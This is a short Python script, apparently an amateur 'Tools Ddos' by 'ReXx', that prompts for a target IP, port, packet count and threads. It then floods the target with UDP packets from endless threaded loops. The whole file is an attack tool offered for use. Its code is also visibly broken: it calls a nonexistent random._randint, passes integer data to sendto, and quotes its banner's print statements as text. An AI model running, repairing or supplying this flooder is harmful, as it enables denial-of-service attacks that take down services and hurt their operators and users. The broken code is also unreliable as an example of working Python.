#Codes : ReXx
#Mau Rename Dek? 
import random
import socket
import threading
import os
import sys

os.system("clear")
print("""\033[94m

print("------------------------------------------------------------")
print       (" - - > Tools Ddos < - - ")
print       (" - - > DISCORD : ReXx <- - ")                                   
print       (" - - > Tools By ReXx < - - ")
print       (" - - > Dont Abuse < - - ")
print("------------------------------------------------------------") 

By : ReXx""")

ip = str(input(" Host Or Ip:"))
port = int(input(" Port:"))
choice = str(input(" Ready Attack?(y/n):"))
times = int(input(" Package:"))
threads = int(input(" Threads:"))

os.system("clear")

def run():
	data = random._randint(65535)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f" \033[92m[•] ReXx Attack IP \033[91m{ip} \033[94mPort \033[93m{port} \033[94m!!!")
		except:
			print(f" \033[92m[×] ReXx Attack IP \033[91m{ip} \033[94mPort \033[91m{port} \033[91m!!!")
			
def run2():
	data = random._randint(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f" \033[92m[•] ReXx Attack IP \033[91m{ip} \033[94mPort \033[93m{port} \033[94m!!!")
		except:
			print(f" \033[92m[×] ReXx Attack IP \033[91m{ip} \033[94mPort \033[91m{port} \033[91m!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()